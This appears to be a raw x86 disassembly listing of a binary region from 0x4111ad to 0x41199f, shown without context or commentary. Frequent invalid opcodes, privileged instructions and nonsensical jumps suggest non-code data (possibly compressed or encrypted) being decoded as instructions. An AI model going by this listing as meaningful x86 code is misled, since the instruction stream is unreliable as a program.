  4111ad:	imul   ecx,DWORD PTR [ecx+0x4110194d],0x206c020e
  4111b7:	(bad)  
  4111b8:	stos   BYTE PTR es:[edi],al
  4111b9:	pop    ds
  4111ba:	mov    ch,0xfb
  4111bc:	jb     0x411165
  4111be:	sti    
  4111bf:	in     al,0x9a
  4111c1:	jmp    0x41114e
  4111c3:	inc    esp
  4111c4:	pop    ecx
  4111c5:	imul   ecx,DWORD PTR [ecx-0x7203aebc],0xacebee23
  4111cf:	(bad)  
  4111d0:	jnp    0x411167
  4111d2:	test   BYTE PTR [edx+0x178c213e],0xc3
  4111d9:	sub    BYTE PTR [eax+0x7b7620f],dl
  4111df:	jmp    eax
  4111e1:	and    ebp,DWORD PTR [edx]
  4111e3:	dec    esp
  4111e4:	sub    al,0x41
  4111e6:	push   ss
  4111e7:	test   BYTE PTR ds:0x764c7f19,dh
  4111ed:	sbb    eax,DWORD PTR [edx]
  4111ef:	dec    ebx
  4111f0:	jle    0x4111e8
  4111f2:	pop    ss
  4111f3:	jb     0x41123e
  4111f5:	inc    ebx
  4111f6:	and    ah,bl
  4111f8:	sub    ch,BYTE PTR [ecx-0x76]
  4111fb:	inc    ebp
  4111fc:	add    BYTE PTR [eax],al
  4111fe:	add    BYTE PTR [eax],al
  411200:	add    BYTE PTR [ecx-0xef1bc5a],ah
  411206:	push   ebx
  411207:	pop    ds
  411208:	(bad)  
  411209:	adc    dh,BYTE PTR ds:0xa17a07b7
  41120f:	inc    esi
  411210:	jecxz  0x411214
  411212:	xchg   ecx,eax
  411213:	sub    al,0xf1
  411215:	adc    BYTE PTR [ecx+0x1f3b8a16],bl
  41121b:	jg     0x4111dc
  41121d:	jp     0x411221
  41121f:	ins    DWORD PTR es:[edi],dx
  411220:	push   edi
  411221:	(bad)  
  411222:	adc    DWORD PTR [ebp-0x25],ebx
  411225:	cmp    edx,edi
  411227:	in     eax,0x7d
  411229:	or     BYTE PTR [edi],ah
  41122b:	dec    ebp
  41122c:	pop    ss
  41122d:	std    
  41122e:	mov    eax,0x1bb4daa4
  411233:	pop    ds
  411234:	and    DWORD PTR [ebx+0x56c16111],edi
  41123a:	ret    0xc95f
  41123d:	xchg   BYTE PTR [ebx-0x55],bh
  411240:	fbstp  TBYTE PTR [edx]
  411242:	sbb    eax,0xa318acd
  411247:	iret   
  411248:	shl    BYTE PTR [esi+0x1],0x5c
  41124c:	jae    0x4111e4
  41124e:	adc    DWORD PTR ds:0xed9e20db,eax
  411254:	sbb    bh,0x27
  411257:	cmc    
  411258:	push   ss
  411259:	sbb    DWORD PTR [eax-0x17],0xffffff8a
  41125d:	mov    eax,0x764df5d2
  411262:	cli    
  411263:	sub    ebp,ebx
  411265:	add    BYTE PTR [eax],al
  411267:	add    BYTE PTR [eax],al
  411269:	add    BYTE PTR [ecx-0x377f1aea],dh
  41126f:	es int 0x16
  411272:	dec    ebx
  411273:	(bad)  
  411274:	fcom   QWORD PTR [esi]
  411276:	leave  
  411277:	out    0x52,al
  411279:	add    al,0x3a
  41127b:	xchg   edi,eax
  41127c:	aam    0x8a
  41127e:	dec    ebx
  41127f:	adc    DWORD PTR [ebx],esi
  411281:	cld    
  411282:	(bad)  
  411283:	cmp    al,0x3e
  411285:	pop    ss
  411286:	test   eax,0x6e909df2
  41128b:	adc    DWORD PTR [ebx],ebx
  41128d:	or     al,0x1d
  41128f:	pop    esi
  411290:	mov    al,0x16
  411292:	or     eax,DWORD PTR [edi+0x1ac48fa8]
  411298:	push   ecx
  411299:	add    DWORD PTR [ebp+0x2],esi
  41129c:	add    BYTE PTR [edx-0x4b],ah
  41129f:	in     al,0x3f
  4112a1:	pusha  
  4112a2:	mov    ch,0xe4
  4112a4:	dec    edi
  4112a5:	push   edx
  4112a6:	into   
  4112a7:	jnp    0x4112ed
  4112a9:	popa   
  4112aa:	mov    ecx,0xfde613c5
  4112af:	(bad)  
  4112b0:	jecxz  0x411300
  4112b2:	arpl   sp,cx
  4112b4:	pop    ebp
  4112b5:	aad    0x7b
  4112b7:	test   DWORD PTR ds:0xe106344,edi
  4112bd:	jg     0x411336
  4112bf:	lds    edi,FWORD PTR [eax]
  4112c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112c2:	jp     0x4112c4
  4112c4:	test   ecx,ecx
  4112c6:	adc    BYTE PTR [eax],0xfe
  4112c9:	push   ds
  4112ca:	mov    ch,0xf4
  4112cc:	(bad)  
  4112cd:	pushf  
  4112ce:	add    BYTE PTR [eax],al
  4112d0:	add    BYTE PTR [eax],al
  4112d2:	add    BYTE PTR [edx-0x1af20066],dh
  4112d8:	in     al,dx
  4112d9:	mov    bl,BYTE PTR [esi]
  4112db:	imul   edx,DWORD PTR [esi-0x48d08de9],0xfffffffe
  4112e2:	jl     0x41134a
  4112e4:	adc    DWORD PTR [ebp+ebx*8-0x7d],esi
  4112e8:	xchg   esi,eax
  4112e9:	pop    es
  4112ea:	rcl    DWORD PTR [ebx],1
  4112ec:	cmp    dh,bh
  4112ee:	(bad)  
  4112f0:	dec    edi
  4112f1:	jae    0x411283
  4112f3:	sahf   
  4112f4:	mov    dh,0x1
  4112f6:	jmp    0xd858e71
  4112fb:	cmp    DWORD PTR [ebx+0x44],edi
  4112fe:	add    eax,0x622e1d01
  411303:	repnz pop ss
  411305:	cmp    BYTE PTR [eiz*1+0x54898d01],ah
  41130c:	adc    dh,bh
  41130e:	loop   0x4112f0
  411310:	fwait
  411311:	push   cs
  411312:	push   0x61
  411314:	and    edi,esi
  411316:	mov    ?,WORD PTR [eax+0x58]
  411319:	add    al,BYTE PTR [eax]
  41131b:	xchg   DWORD PTR [eax+0x2e],ecx
  41131e:	cmovb  eax,DWORD PTR [edx]
  411321:	or     BYTE PTR [ebx+0x25],al
  411324:	push   ecx
  411325:	repnz (bad)
  411328:	shl    ecx,0xff
  41132b:	pop    ebx
  41132c:	cmc    
  41132d:	inc    ebx
  41132e:	adc    al,0x3b
  411330:	jg     0x411354
  411332:	push   0xffffffdc
  411334:	div    BYTE PTR [ebx+0x1c]
  411337:	add    BYTE PTR [eax],al
  411339:	add    BYTE PTR [eax],al
  41133b:	add    BYTE PTR [edi-0x23],dl
  41133e:	std    
  41133f:	jne    0x411315
  411341:	jp     0x41130c
  411343:	push   esi
  411344:	jnp    0x4113c5
  411346:	push   cs
  411347:	push   ecx
  411349:	pop    es
  41134a:	push   DWORD PTR [ebp-0x6c]
  41134d:	fcomi  st,st(7)
  41134f:	xlat   BYTE PTR ds:[ebx]
  411350:	pop    ebx
  411351:	cmc    
  411352:	add    eax,0x0
  411355:	mov    dl,0xe7
  411357:	clc    
  411358:	popf   
  411359:	add    eax,DWORD PTR [eax]
  41135b:	mov    edx,ecx
  41135d:	das    
  41135e:	ds mov ecx,edx
  411361:	das    
  411362:	dec    esi
  411363:	jmp    0x411309
  411365:	jp     0x4113aa
  411367:	clc    
  411368:	and    eax,0xc90f1250
  41136d:	and    ecx,0x5c2a5bff
  411373:	ins    BYTE PTR es:[edi],dx
  411374:	dec    ebx
  411375:	or     BYTE PTR [ecx+0xdf62be4],0xb6
  41137c:	pop    edi
  41137d:	inc    edx
  41137e:	aaa    
  41137f:	inc    ebp
  411380:	add    BYTE PTR [esi],al
  411382:	test   BYTE PTR [ebp+0x2f],ch
  411385:	idiv   ch
  411387:	jmp    DWORD PTR [ecx+0x12]
  41138a:	std    
  41138b:	jne    0x4113fd
  41138d:	pop    esp
  41138e:	(bad)  
  41138f:	inc    BYTE PTR [ecx-0x42876f6]
  411395:	jg     0x4113ad
  411397:	mov    esi,DWORD PTR [ebp+0x64]
  41139a:	lods   al,BYTE PTR ds:[esi]
  41139b:	inc    BYTE PTR [eax+0x741309]
  4113a1:	add    BYTE PTR [eax],al
  4113a3:	add    BYTE PTR [eax],al
  4113a5:	jno    0x41132f
  4113a7:	lea    eax,[edi]
  4113a9:	or     eax,0xf2fe2bbc
  4113ae:	popf   
  4113af:	inc    edx
  4113b0:	jae    0x4113de
  4113b2:	and    BYTE PTR [eax+0x0],0x75
  4113b6:	sbb    DWORD PTR [eax+0x182ccf1],ebp
  4113bc:	add    BYTE PTR [ebp-0x5c],dh
  4113bf:	mov    ebp,0xee65fcfb
  4113c4:	mov    bh,BYTE PTR [eax]
  4113c6:	std    
  4113c7:	ret    
  4113c8:	mov    BYTE PTR [eax],dh
  4113ca:	add    eax,0x1a15e8b4
  4113cf:	add    al,BYTE PTR [eax]
  4113d1:	(bad)  
  4113d2:	sbb    bh,BYTE PTR gs:[eax]
  4113d5:	cmp    BYTE PTR ds:0xfc788d03,cl
  4113db:	adc    edi,esi
  4113dd:	(bad)  
  4113de:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4113e0:	cmp    ch,BYTE PTR [edi+ebp*1+0x799227f]
  4113e7:	adc    al,0x82
  4113e9:	clc    
  4113ea:	adc    al,0x5
  4113ec:	jne    0x4113a4
  4113ee:	mov    al,ds:0xdbf017bc
  4113f3:	mov    ss,WORD PTR [esi]
  4113f5:	iret   
  4113f6:	sbb    esi,DWORD PTR [edx+0x7d0fc38c]
  4113fc:	ret    0x665d
  4113ff:	lock dec DWORD PTR [edx-0x59]
  411403:	inc    ebx
  411404:	push   cs
  411405:	clc    
  411406:	dec    ebx
  411407:	and    eax,0xfe
  41140c:	add    BYTE PTR [eax],al
  41140e:	cmp    dh,BYTE PTR [ecx]
  411410:	call   0xdd78cf9f
  411415:	(bad)  
  411416:	outs   dx,BYTE PTR ds:[esi]
  411417:	jb     0x4113b3
  411419:	sbb    ebp,edi
  41141b:	add    dh,dl
  41141d:	int    0xa8
  41141f:	ficom  WORD PTR [ebx]
  411421:	stc    
  411422:	test   DWORD PTR [edx],0x37f102e7
  411428:	mov    dl,BYTE PTR [ebx]
  41142a:	add    edi,DWORD PTR [ecx+0x29]
  41142d:	add    eax,0x2cbc43f
  411432:	stc    
  411433:	cmp    ecx,DWORD PTR [edx+0x1b79eb13]
  411439:	sbb    BYTE PTR [ebx+0x54],dh
  41143c:	jmp    0xa949c9c7
  411441:	xchg   ch,cl
  411443:	std    
  411444:	in     eax,0x8a
  411446:	inc    edi
  411447:	or     eax,0xe6c3134d
  41144c:	jae    0x4114b5
  41144e:	ja     0x411413
  411450:	call   0xe639bedb
  411455:	xchg   ebx,eax
  411457:	add    ch,cl
  411459:	add    esi,DWORD PTR [edx-0x7c]
  41145c:	dec    eax
  41145d:	es fwait
  41145f:	or     eax,0x947e0c69
  411464:	clc    
  411465:	xchg   BYTE PTR [edx+0x41ee94ff],al
  41146b:	xchg   eax,ebp
  41146d:	add    esi,DWORD PTR [ebp-0x3]
  411470:	arpl   WORD PTR [edi+0x0],di
  411473:	add    BYTE PTR [eax],al
  411475:	add    BYTE PTR [eax],al
  411477:	push   esp
  411478:	or     eax,0xcb2ad6f5
  41147d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41147e:	mov    ds:0x256a8773,eax
  411483:	pop    ebx
  411484:	or     eax,0xd525fcf
  411489:	call   0xdddfbd5c
  41148e:	xchg   BYTE PTR [edi],dl
  411490:	add    ch,cl
  411492:	add    esi,ebp
  411494:	enter  0x2f2,0xf8
  411498:	addr16 (bad) 
  41149a:	call   0xc0841715
  41149f:	stos   BYTE PTR es:[edi],al
  4114a0:	or     eax,0x14f3e9fe
  4114a5:	or     dh,ch
  4114a7:	cli    
  4114a8:	stos   BYTE PTR es:[edi],al
  4114a9:	loope  0x411441
  4114ab:	addr16 xor bh,0xc9
  4114af:	ja     0x411437
  4114b1:	push   eax
  4114b2:	mov    esp,DWORD PTR [edi+0xc]
  4114b5:	cmp    al,0x49
  4114b7:	jbe    0x4114bb
  4114b9:	add    BYTE PTR [edx-0x1f087ff3],al
  4114bf:	or     dl,BYTE PTR [edi-0x6f299e7e]
  4114c5:	jo     0x4114e3
  4114c7:	pop    ecx
  4114c8:	or     eax,0x8777e9fe
  4114cd:	xor    al,0x4b
  4114cf:	addr16 or al,0xea
  4114d2:	int    0xf3
  4114d4:	adc    al,0x9
  4114d6:	mov    ebx,0xe4f77fe7
  4114db:	add    BYTE PTR [eax],al
  4114dd:	add    BYTE PTR [eax],al
  4114df:	add    BYTE PTR [edi-0x7c],dh
  4114e2:	and    al,0x4b
  4114e4:	xchg   DWORD PTR [esp+edi*1],ecx
  4114e7:	ins    BYTE PTR es:[edi],dx
  4114e8:	jbe    0x4114ec
  4114ea:	add    BYTE PTR [edx],dl
  4114ec:	sar    DWORD PTR [edi-0x9],1
  4114ef:	jecxz  0x411568
  4114f1:	adc    BYTE PTR [ebx+ecx*1],0x67
  4114f5:	or     al,0x82
  4114f7:	add    DWORD PTR [ebp-0x6c],esi
  4114fa:	inc    eax
  4114fb:	mov    esp,0xe9fe0bfd
  411500:	mov    edi,DWORD PTR ds:0x164a9f8a
  411506:	add    esi,ecx
  411508:	jb     0x411521
  41150a:	les    esi,FWORD PTR [edx+0x37]
  41150d:	shl    ch,1
  41150f:	in     eax,dx
  411510:	dec    esi
  411511:	add    bl,ch
  411513:	or     eax,eax
  411515:	mov    ebp,0xfafa0033
  41151a:	pop    es
  41151b:	add    DWORD PTR [edi-0x4a],eax
  41151e:	mov    DWORD PTR [esi+0x28],ecx
  411521:	jmp    0x8b0e:0xef0d0802
  411528:	bound  ebp,QWORD PTR [edx]
  41152a:	hlt    
  41152b:	add    al,0x4
  41152d:	adc    cl,ch
  41152f:	mov    eax,ds:0xf6324097
  411534:	sbb    BYTE PTR [eax],cl
  411536:	push   cs
  411537:	js     0x7440f4fe
  41153d:	icebp  
  41153e:	inc    ebx
  41153f:	adc    al,0x63
  411541:	jae    0x411565
  411543:	push   0x0
  411545:	add    BYTE PTR [eax],al
  411547:	add    BYTE PTR [eax],al
  411549:	int3   
  41154a:	bnd jae 0x411569
  41154d:	addr16 leave 
  41154f:	std    
  411550:	jne    0x4115c6
  411552:	(bad)  
  411553:	leave  
  411554:	push   esi
  411555:	and    esi,DWORD PTR [ebx+0xe]
  411558:	jmp    FWORD PTR [ecx-0x3b8a02f5]
  41155e:	out    0x3,eax
  411560:	(bad)  
  411561:	jae    0x411554
  411563:	add    eax,0xffffff93
  411566:	cmp    DWORD PTR [ebx-0x2],0x53
  41156a:	icebp  
  41156b:	jmp    0x57401b73
  411570:	pop    edi
  411571:	rcr    BYTE PTR [esi-0x39],cl
  411574:	ret    0xffbc
  411577:	(bad)  
  411578:	ss push eax
  41157a:	inc    esi
  41157b:	(bad)  
  41157c:	adc    ebp,DWORD PTR [esi+0x46]
  41157f:	(bad)  
  411580:	sbb    BYTE PTR [esi+0x46],bh
  411583:	(bad)  
  411584:	and    eax,0x57fe467e
  411589:	outs   dx,DWORD PTR ds:[esi]
  41158a:	inc    esi
  41158b:	(bad)  
  41158c:	push   esi
  41158d:	sub    BYTE PTR [edi],bh
  41158f:	(bad)  
  411590:	imul   edi,DWORD PTR [eax],0x3f
  411593:	inc    BYTE PTR [esi-0x3dc28b]
  411599:	fiadd  WORD PTR [edx+eax*8-0x1]
  41159d:	or     BYTE PTR ds:0x453bffc2,bh
  4115a3:	ret    0x43ff
  4115a6:	cmp    dl,al
  4115a8:	call   DWORD PTR [ebp+0x45]
  4115ab:	ret    0xff
  4115ae:	add    BYTE PTR [eax],al
  4115b0:	add    BYTE PTR [eax],al
  4115b2:	cmp    DWORD PTR [ebp-0x3e],edi
  4115b5:	(bad)  
  4115b6:	mov    ebp,0x34ffc286
  4115bb:	jle    0x41157f
  4115bd:	(bad)  
  4115be:	aas    
  4115bf:	add    edx,0xffffffff
  4115c2:	jp     0x41163f
  4115c4:	ret    0xe9ff
  4115c7:	jbe    0x41158b
  4115c9:	call   ebx
  4115cb:	jbe    0x41158f
  4115cd:	push   ebp
  4115cf:	jl     0x411593
  4115d1:	inc    DWORD PTR [ecx]
  4115d3:	mov    edx,0xb79fffc2
  4115d8:	ret    0xc5ff
  4115db:	rol    dl,0xff
  4115de:	fs ret 0xffc2
  4115e2:	cmp    DWORD PTR [eax-0x4df6003e],esi
  4115e8:	ret    0x45ff
  4115eb:	ret    0xffc2
  4115ee:	imul   eax,edx,0xf20bffc2
  4115f4:	ret    0x11ff
  4115f7:	bnd ret 0xf2ff
  4115fb:	add    ebx,eax
  4115fd:	jmp    FWORD PTR [edx+eax*1]
  411600:	ret    
  411601:	dec    DWORD PTR [esi-0xb]
  411604:	ret    0x40ff
  411607:	cmc    
  411608:	ret    0x20ff
  41160b:	add    eax,0x54effc3
  411610:	ret    
  411611:	call   FWORD PTR [ebx+eax*1-0x2e]
  411615:	les    eax,FWORD PTR [eax]
  411617:	add    BYTE PTR [eax],al
  411619:	add    BYTE PTR [eax],al
  41161b:	push   edx
  41161c:	dec    esp
  41161e:	les    ecx,FWORD PTR [edx-0xc]
  411621:	(bad)  
  411622:	les    eax,FWORD PTR [edx+0x6c]
  411625:	mov    esi,0xd6cf3ac4
  41162a:	les    esi,FWORD PTR [edx]
  41162c:	test   dh,0xc4
  41162f:	sub    ah,BYTE PTR [edi-0x61dd3b3a]
  411635:	mov    esi,0x96961ac4
  41163a:	les    edx,FWORD PTR [edx]
  41163c:	test   BYTE PTR [esi-0x7efdf53c],cl
  411642:	les    eax,FWORD PTR [edx]
  411644:	aas    
  411645:	xchg   ah,al
  411647:	cli    
  411648:	mov    BYTE PTR [edx-0x64d10d3c],al
  41164e:	(bad)  
  41164f:	jmp    0x88da:0xe2c49598
  411656:	(bad)  
  411657:	fidivr DWORD PTR [ecx+0x44]
  41165a:	(bad)  
  41165b:	shr    al,cl
  41165d:	cmp    eax,esp
  41165f:	retf   0x3354
  411662:	(bad)
  411666:	les    edi,FWORD PTR [edx-0x4d3bc4d6]
  41166c:	inc    edi
  41166d:	xor    eax,esp
  41166f:	stos   BYTE PTR es:[edi],al
  411670:	sub    bl,BYTE PTR ds:0xd81a2c4
  411676:	les    ebx,FWORD PTR [edx-0x6d3bbac5]
  41167c:	xor    edx,DWORD PTR [esi]
  41167e:	les    eax,FWORD PTR [eax]
  411680:	add    BYTE PTR [eax],al
  411682:	add    BYTE PTR [eax],al
  411684:	mov    al,BYTE PTR [ebp+0x4282c41d]
  41168a:	adc    eax,0xf67ac4
  41168f:	les    esi,FWORD PTR [edx-0x4a]
  411692:	add    ah,al
  411694:	push   0x6f
  411696:	push   eax
  411698:	ss or  ecx,edx
  41169b:	icebp  
  41169c:	or     DWORD PTR ss:[ebp-0x22],eax
  4116a0:	or     DWORD PTR ss:[edx],ebx
  4116a3:	retf   0x936
  4116a6:	shl    BYTE PTR [edx-0x36f2f6ca],1
  4116ac:	or     DWORD PTR ss:[esi-0x18],esi
  4116b0:	cmp    DWORD PTR [ecx],ecx
  4116b2:	(bad)  
  4116b3:	call   0xed451c2c
  4116b8:	ins    DWORD PTR es:[edi],dx
  4116b9:	add    BYTE PTR [edi],al
  4116bb:	loope  0x4116d6
  4116bd:	sti    
  4116be:	or     dh,ch
  4116c0:	adc    bh,BYTE PTR [edx-0x7f713b8]
  4116c6:	psubb  mm0,mm1
  4116c9:	repnz adc dh,ch
  4116cc:	std    
  4116cd:	out    dx,al
  4116ce:	push   ss
  4116cf:	loope  0x4116b2
  4116d1:	jmp    0xd219:0xeadce319
  4116d8:	iret   
  4116d9:	in     al,dx
  4116da:	sbb    al,0xcf
  4116dc:	retf   
  4116dd:	call   0xe2191f02
  4116e2:	and    BYTE PTR [eax],cl
  4116e4:	xlat   BYTE PTR ds:[ebx]
  4116e5:	loop   0x411709
  4116e7:	or     eax,0x0
  4116ec:	add    ah,cl
  4116ee:	fisub  WORD PTR [esi]
  4116f0:	add    DWORD PTR [ecx-0x2eeed820],ebx
  4116f6:	fldcw  WORD PTR [eax]
  4116f8:	adc    ecx,esi
  4116fa:	fsubr  QWORD PTR [edi+eax*1]
  4116fd:	loopne 0x4116b8
  4116ff:	dec    eax
  411700:	mov    al,ds:0xb048b9d9
  411705:	mov    bl,0xd7
  411707:	dec    eax
  411708:	fldenv [ecx-0x5522cd2e]
  41170e:	aam    0x34
  411710:	xlat   BYTE PTR ds:[ebx]
  411711:	popf   
  411712:	into   
  411713:	add    BYTE PTR ss:[edi+esi*1],dh
  411717:	cmp    BYTE PTR [ebx],bh
  411719:	xor    eax,0x1549393a
  41171e:	inc    edi
  41171f:	inc    edi
  411720:	dec    ecx
  411721:	or     BYTE PTR [ebx],dh
  411723:	cmp    al,0x3f
  411725:	pushf  
  411726:	inc    ebx
  411727:	inc    eax
  411728:	inc    ebx
  411729:	nop
  41172a:	aas    
  41172b:	inc    esp
  41172c:	add    BYTE PTR [ebx+0x1ce48e46],dl
  411732:	aas    
  411733:	(bad)  
  411734:	pop    ds
  411735:	in     eax,dx
  411736:	ds (bad) 
  411738:	pop    ebx
  411739:	in     eax,dx
  41173a:	ds (bad) 
  41173c:	xchg   edi,eax
  41173d:	fnstsw WORD PTR [esi]
  41173f:	(bad)  
  411740:	rcr    ch,1
  411742:	inc    BYTE PTR ds:0xe7fe3eee
  411749:	cli    
  41174a:	ds (bad) 
  41174c:	pop    ebp
  41174d:	sti    
  41174e:	ds (bad) 
  411750:	pop    ebp
  411751:	add    BYTE PTR [eax],al
  411753:	add    BYTE PTR [eax],al
  411755:	add    BYTE PTR [ebx+0x3e],bh
  411758:	(bad)  
  411759:	fdivr  st,st(3)
  41175b:	ds (bad) 
  41175d:	fsubr  DWORD PTR [ebx+0x3e]
  411760:	(bad)  
  411761:	jno    0x41175e
  411763:	ds (bad) 
  411765:	rcr    DWORD PTR [ebx+0x3e],cl
  411768:	(bad)  
  411769:	sbb    ebp,DWORD PTR [esi+edi*1]
  41176c:	(bad)  
  41176d:	pop    ebx
  41176e:	sub    al,0x3e
  411770:	(bad)  
  411771:	lahf   
  411772:	sbb    al,0x3e
  411774:	(bad)  
  411775:	and    BYTE PTR gs:[esi],bh
  411778:	(bad)  
  411779:	xchg   edi,eax
  41177a:	jo     0x4117ba
  41177c:	dec    cl
  41177e:	pusha  
  41177f:	ds (bad) 
  411781:	sti    
  411782:	pusha  
  411783:	ds (bad) 
  411785:	sub    eax,0x5ffe3e61
  41178a:	jno    0x4117ca
  41178c:	(bad)  
  41178d:	data16 outs dx,BYTE PTR ds:[esi]
  41178f:	ds (bad) 
  411791:	mov    esp,0xffc3eb75
  411796:	mov    ecx,0x4dffc3eb
  41179b:	add    ah,al
  41179d:	dec    DWORD PTR [ebp+0x8]
  4117a0:	ret    0xa9ff
  4117a3:	or     al,0xc2
  4117a5:	jmp    DWORD PTR [esp+ecx*1]
  4117a8:	ret    0x33ff
  4117ab:	sub    al,0xc2
  4117ad:	call   DWORD PTR [eax-0x5e003dd3]
  4117b3:	and    eax,0x1a67ffc2
  4117b8:	sar    edi,0x0
  4117bb:	add    BYTE PTR [eax],al
  4117bd:	add    BYTE PTR [eax],al
  4117bf:	mov    ds,WORD PTR [edx]
  4117c1:	sar    edi,0x51
  4117c4:	sbb    al,cl
  4117c6:	call   DWORD PTR [eax+0x1a]
  4117c9:	sar    edi,0x63
  4117cc:	sbb    al,cl
  4117ce:	call   DWORD PTR [edx+0x1a]
  4117d1:	sar    edi,0xb9
  4117d4:	sbb    al,cl
  4117d6:	push   DWORD PTR [ecx-0x56003ee6]
  4117dc:	sbb    al,cl
  4117de:	dec    ebp
  4117e0:	jg     0x4117a4
  4117e2:	dec    ebp
  4117e4:	xchg   edx,eax
  4117e6:	call   DWORD PTR [ecx+0x19]
  4117e9:	sar    edi,0x1d
  4117ec:	sbb    ecx,eax
  4117ee:	jmp    DWORD PTR [eax+ebx*1+0x18ddffc1]
  4117f5:	sar    edi,0xc0
  4117f8:	sbb    cl,al
  4117fa:	jmp    DWORD PTR [ecx]
  4117fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4117fd:	push   ds
  4117fe:	and    BYTE PTR [ecx+0x75000104],0x9c
  411805:	mov    ebp,0xbd9ba2f3
  41180a:	out    dx,eax
  41180b:	call   0xba01:0x92cbbd9b
  411812:	js     0x41183d
  411814:	cli    
  411815:	mov    dh,0xd0
  411817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411818:	scas   al,BYTE PTR es:[edi]
  411819:	popa   
  41181a:	or     ebp,ecx
  41181c:	ret    0x7a0d
  41181f:	leave  
  411820:	and    ch,BYTE PTR [edi-0x4a]
  411823:	add    BYTE PTR [eax],al
  411825:	add    BYTE PTR [eax],al
  411827:	add    BYTE PTR [edx],dh
  411829:	jl     0x4117be
  41182b:	das    
  41182c:	in     eax,dx
  41182d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41182e:	hlt    
  41182f:	jns    0x4117f2
  411831:	sbb    bl,BYTE PTR [edi-0x3a]
  411834:	inc    edx
  411835:	jp     0x411814
  411837:	iret   
  411838:	dec    esp
  411839:	mul    BYTE PTR [eax+eiz*8+0x7b]
  41183d:	add    ch,cl
  41183f:	into   
  411840:	sbb    al,0xf6
  411842:	fs call 0xcd2a1ac3
  411848:	shl    edx,0x33
  41184b:	std    
  41184c:	pop    ebp
  41184d:	scas   eax,DWORD PTR es:[edi]
  41184e:	fdiv   st(2),st
  411850:	jmp    0x411846
  411852:	in     eax,0x3
  411854:	jne    0x411821
  411856:	cmp    esi,eax
  411858:	mov    ebp,edi
  41185a:	adc    dl,BYTE PTR ds:0x3edff0d
  411860:	jne    0x411857
  411862:	push   ebp
  411863:	ret    
  411864:	mov    al,BYTE PTR [ecx]
  411866:	scas   al,BYTE PTR es:[edi]
  411867:	jge    0x41185a
  411869:	mov    dl,0x7d
  41186b:	or     esp,ebx
  41186d:	cmc    
  41186e:	cmp    eax,0x637b7ec3
  411873:	mov    esp,0xfb6505d3
  411878:	add    edi,DWORD PTR [esi-0x490682fe]
  41187e:	push   ebp
  41187f:	or     edi,DWORD PTR [ebx-0x7c3a57b6]
  411885:	add    dh,BYTE PTR [eax-0x7f]
  411888:	pop    esi
  411889:	add    eax,0xb3d
  41188e:	add    BYTE PTR [eax],al
  411890:	add    ch,ch
  411892:	jg     0x411893
  411894:	clc    
  411895:	outs   dx,DWORD PTR ds:[esi]
  411896:	add    al,0xfe
  411898:	bound  esi,QWORD PTR [esi+0x36bc88e5]
  41189e:	jp     0x4118e4
  4118a0:	and    DWORD PTR [edx+0x37ee7443],esi
  4118a6:	mov    esi,0xc50f31f7
  4118ab:	jmp    DWORD PTR [edi+0x3e]
  4118ae:	mov    esi,0x9126aa51
  4118b3:	and    eax,0xfd38f464
  4118b8:	out    dx,al
  4118b9:	jg     0x411870
  4118bb:	imul   ebp,ecx,0xdff77ecd
  4118c1:	outs   dx,DWORD PTR ds:[esi]
  4118c2:	add    al,0x4f
  4118c4:	bound  esi,QWORD PTR [edi+0x7f6c091d]
  4118ca:	add    al,0x8a
  4118cc:	mov    ecx,0xe6740ef5
  4118d1:	add    BYTE PTR [ecx],cl
  4118d3:	call   0x438d32
  4118d8:	cli    
  4118d9:	dec    eax
  4118da:	js     0x411921
  4118dc:	icebp  
  4118dd:	mov    edi,DWORD PTR ds:0x420891c0
  4118e3:	call   0x660cd5
  4118e8:	push   0xffffff99
  4118ea:	add    cl,BYTE PTR [ecx-0x490b5ad4]
  4118f0:	daa    
  4118f1:	sar    DWORD PTR [ecx+0x4c],cl
  4118f4:	xchg   ecx,eax
  4118f5:	add    BYTE PTR [eax],al
  4118f7:	add    BYTE PTR [eax],al
  4118f9:	add    bh,bl
  4118fb:	dec    ebx
  4118fc:	dec    ebp
  4118fd:	fnstsw WORD PTR [ecx]
  4118ff:	sbb    al,BYTE PTR [edx]
  411901:	push   0xffffff91
  411903:	add    cl,BYTE PTR [ecx-0x1fc5d94]
  411909:	push   esi
  41190a:	mov    edi,0xafed4d4b
  41190f:	push   ebx
  411910:	mov    DWORD PTR [eax],0x1844afa3
  411916:	and    eax,0x1038e5a
  41191b:	or     eax,0xbd9fcf01
  411920:	xchg   DWORD PTR [ebp+0x0],eax
  411923:	xchg   BYTE PTR [ebx-0x50],dl
  411926:	add    eax,0xca8b925a
  41192b:	or     BYTE PTR [edi-0x38d2a618],bh
  411931:	inc    ecx
  411932:	aas    
  411933:	mov    edi,0xf8f48587
  411938:	std    
  411939:	call   edi
  41193b:	inc    ecx
  41193c:	push   es
  41193d:	shl    DWORD PTR [esp+eax*1+0x21],0xc1
  411942:	lds    eax,FWORD PTR [ebx-0x1e]
  411945:	mov    ecx,ebx
  411947:	push   0xfffffffd
  411949:	jmp    DWORD PTR [ebx]
  41194b:	xchg   BYTE PTR [eax+ecx*1-0x23],al
  41194f:	out    0x1b,al
  411951:	and    ebx,ebp
  411953:	xchg   DWORD PTR [ebx-0x2061c8c],eax
  411959:	mov    ecx,DWORD PTR [edx+0x6]
  41195c:	mov    edi,0xe8
  411961:	add    BYTE PTR [eax],al
  411963:	and    eax,0x9989bf1f
  411968:	outs   dx,BYTE PTR ds:[esi]
  411969:	std    
  41196a:	jmp    ebx
  41196c:	test   DWORD PTR [ebx-0x8],eax
  41196f:	xchg   ebp,eax
  411970:	adc    DWORD PTR [esi-0x1],0x3
  411974:	cli    
  411975:	add    eax,DWORD PTR [eax-0x21]
  411978:	(bad)  
  411979:	dec    DWORD PTR [eax-0x29db7]
  41197f:	arpl   WORD PTR [edi-0x69c976d],ax
  411985:	std    
  411986:	mov    DWORD PTR [ecx+0x7a],ecx
  411989:	std    
  41198a:	jmp    DWORD PTR [ebx]
  41198c:	xchg   DWORD PTR [ebx-0x80],edx
  41198f:	jne    0x411933
  411991:	scas   al,BYTE PTR es:[edi]
  411992:	mov    ds:0x887e4efc,eax
  411997:	inc    eax
  411998:	aad    0x7a
  41199a:	push   esp
  41199b:	loope  0x41192f
  41199d:	jle    0x4119fa
  41199f:	call   0x7921:0x3b8a08cc
